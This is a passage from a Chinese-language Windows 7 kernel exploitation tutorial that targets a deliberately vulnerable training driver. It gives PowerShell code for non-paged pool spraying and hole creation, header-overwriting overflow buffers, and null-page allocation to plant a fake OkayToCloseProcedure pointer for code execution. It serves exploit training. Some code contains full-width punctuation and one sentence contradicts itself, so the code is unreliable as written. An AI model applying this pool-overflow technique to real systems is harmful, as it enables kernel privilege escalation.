    "@
    function Event-PoolSpray {
        echo "[+] Derandomizing NonPagedPool.."
        $Spray = @()
        for ($i=0;$i -lt 10000;$i++) {
            $CallResult = [EVD]::CreateEvent([System.IntPtr]::Zero， 0， 0， "")
            if ($CallResult -ne 0) {
                $Spray += $CallResult
            }
        }
        $Script:Event_hArray1 += $Spray
        echo "[+] $($Event_hArray1。Length) event objects created!"
        echo "[+] Allocating sequential objects.."
        $Spray = @()
        for ($i=0;$i -lt 5000;$i++) {
            $CallResult = [EVD]::CreateEvent([System。IntPtr]::Zero， 0， 0， "")
            if ($CallResult -ne 0) {
                $Spray += $CallResult
            }
        }
        $Script:Event_hArray2 += $Spray
        echo "[+] $($Event_hArray2。Length) event objects created!"
    }
    echo "`n[>] Spraying non-paged kernel pool!"
    Event-PoolSpray
    echo "`n[>] Last 10 object handles:"
    for ($i=1;$i -lt 11; $i++) {
        "{0:X}" -f $($($Event_hArray2[-$i]))
    }
    Start-Sleep -s 3
    echo "`n[>] Triggering WinDBG breakpoint.."
    [EVD]::DebugBreak()
你应该会看到类似这些东西，并且在WinDBG中命中一个断点。
看一下我们dump出来的其中一个句柄，可以看到漂亮的0 x40字节顺序分配。
为了获得一个理想状态的内存池，我们唯一需要做的就是在我们的第二次分配时释放0
x200字节的内存段。这个时候将创造出一个“洞”给驱动对象使用。下面的POC说明了这一点。
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    public static class EVD
    {
        [DllImport("kernel32.dll"， SetLastError = true)]
        public static extern Byte CloseHandle(
            IntPtr hObject);
        [DllImport("kernel32。dll"， SetLastError = true)]
        public static extern int CreateEvent(
            IntPtr lpEventAttributes，
            Byte  bManualReset，
            Byte bInitialState，
            String lpName);
        [DllImport("kernel32.dll"， SetLastError = true)]
        public static extern void DebugBreak();
    }
    "@
    function Event-PoolSpray {
        echo "[+] Derandomizing NonPagedPool.."
        $Spray = @()
        for ($i=0;$i -lt 10000;$i++) {
            $CallResult = [EVD]::CreateEvent([System.IntPtr]::Zero， 0， 0， "")
            if ($CallResult -ne 0) {
                $Spray += $CallResult
            }
        }
        $Script:Event_hArray1 += $Spray
        echo "[+] $($Event_hArray1。Length) event objects created!"
        echo "[+] Allocating sequential objects.."
        $Spray = @()
        for ($i=0;$i -lt 5000;$i++) {
            $CallResult = [EVD]::CreateEvent([System.IntPtr]::Zero， 0， 0， "")
            if ($CallResult -ne 0) {
                $Spray += $CallResult
            }
        }
        $Script:Event_hArray2 += $Spray
        echo "[+] $($Event_hArray2。Length) event objects created!"
        echo "[+] Creating non-paged pool holes.."
        for ($i=0;$i -lt $($Event_hArray2。Length);$i+=16) {
            for ($j=0;$j -lt 8;$j++) {
                $CallResult = [EVD]::CloseHandle($Event_hArray2[$i+$j])
                if ($CallResult -ne 0) {
                    $FreeCount += 1
                }
            }
        }
        echo "[+] Free'd $FreeCount event objects!"
    }
    echo "`n[>] Spraying non-paged kernel pool!"
    Event-PoolSpray
    echo "`n[>] Last 16 object handles:"
    for ($i=1;$i -lt 17; $i++) {
        "{0:X}" -f $($($Event_hArray2[-$i]))
    }
    Start-Sleep -s 3
    echo "`n[>] Triggering WinDBG breakpoint.."
    [EVD]::DebugBreak()
**内存块结构101**
如前所述，我们将利用“内部内存池”去获得代码执行权。我们已经看到，混乱这些结构的话必然会导致系统蓝屏，所以我们将去更好的理解内存块的布局。
下面我们可以看到一个完整的事件对象以及组成它的各种结构！
首先，这里有一个WinDBG的漏洞，就说明内存块结构而言这其实并不重要不过其非常的令人讨厌！大家都可以看到这里的问题吗?
如果有人可以告诉我为什么我会有免费的蛋糕…(蛋糕是假的了)！无论如何当我们之后执行溢出操作时我们有三个头部数据需要保持一致(一定程度上)。
注意到在OBJECT_HEADER里的大小为0 xc的TypeIndex，这个值是在一个描述内存块对象类型的指针数组里的偏移量。我们可以验证如下。
我们可以进一步列举与事件对象指针相关的OBJECT_TYPE。同时，注意在数组里的第一个指针为空(0 x00000000)。
这里的重要部分是
“OkayToCloseProcedure”的偏移。当对象句柄和内存块被释放后，如果这个值不是null，内核将会跳转到该地址并且执行它在这里找到的任何代码。另外，也可以使用在此结构中的其他元素，如“DeleteProcedure”。
问题是我们如何使用利用它？记住内存块本身包含TypeIndex值(0 xc)，如果我们溢出内存块并改变这个值为0
x0，对象将尝试在空内存页的进程里寻找OBJECT_TYPE结构。因为这是Windows
7，我们可以分配空内存页并创建一个假的“OkayToCloseProcedure”指针指向shellcode。释放后损坏的内核内存块就应该会执行我们的代码！
**控制EIP**
好了，我们快到家了！我们已经控制了内存池的分配并且知道在0
x200字节对象后我们将有0x40字节的事件对象。我们可以使用以下缓冲区去精确地覆盖三个之前看到的内存块头部。
    $PoolHeader = [Byte[]] @(
        0x40， 0x00， 0x08， 0x04， # PrevSize，Size，Index，Type union (0x04080040)
        0x45， 0x76， 0x65， 0xee  # PoolTag -> Event (0xee657645)
    )
    $ObjectHeaderQuotaInfo = [Byte[]] @(
        0x00， 0x00， 0x00， 0x00， # PagedPoolCharge
        0x40， 0x00， 0x00， 0x00， # NonPagedPoolCharge (0x40)
        0x00， 0x00， 0x00， 0x00， # SecurityDescriptorCharge
        0x00， 0x00， 0x00， 0x00  # SecurityDescriptorQuotaBlock
    )
    # 对象头被部分覆盖
    $ObjectHeader = [Byte[]] @(
        0x01， 0x00， 0x00， 0x00， # PointerCount (0x1)
        0x01， 0x00， 0x00， 0x00， # HandleCount (0x1)
        0x00， 0x00， 0x00， 0x00， # Lock -> _EX_PUSH_LOCK
        0x00，                   # TypeIndex (Rewrite 0xC -> 0x0)
        0x00，                   # TraceFlags
        0x08，                   # InfoMask
        0x00                    # Flags
    )
    # HACKSYS_EVD_IOCTL_POOL_OVERFLOW IOCTL = 0x22200F
    #---    $Buffer = [Byte[]](0x41)*0x1f8 + $PoolHeader + $ObjectHeaderQuotaInfo + $ObjectHeader
这里我们要污染的唯一值就是是TypeIndex，将其从0x00改成0x0c。我们可以使用下面的代码仔细构造一份假的“OkayToCloseProcedure”指针。
    echo "`n[>] Allocating process null page.."
    [IntPtr]$ProcHandle = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
    [IntPtr]$BaseAddress = 0x1 # Rounded down to 0x00000000
    [UInt32]$AllocationSize = 120 # 0x78
    $CallResult = [EVD]::NtAllocateVirtualMemory($ProcHandle， [ref]$BaseAddress， 0， [ref]$AllocationSize， 0x3000， 0x40)
    if ($CallResult -ne 0) {
        echo "[!] Failed to allocate null-page..`n"
        Return
    } else {
        echo "[+] Success"
    }
    echo "[+] Writing shellcode pointer to 0x00000074"
    $OkayToCloseProcedure = [Byte[]](0x43)*0x4
    [System.Runtime.InteropServices.Marshal]::Copy($OkayToCloseProcedure， 0， [IntPtr]0x74， $OkayToCloseProcedure.Length)
让我们在WinDBG确认一下我们的观点。
Sw33t，在这个地方几乎要游戏完结了！再次地，细心的读者会注意到之前说的WinDBG漏洞里烦人的提示。
**Shellcode**
和前面的文章的一样，我们可以重用我们的shellcode，然而这里有两个我留给勤奋的读者去弄清楚的小把戏！一个关于shellcode的结尾，另一个是空内存页到缓冲区布局。
**游戏结束**
这就是完整的纲要了，详情请参考下面的完整利用。
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    public static class EVD
    {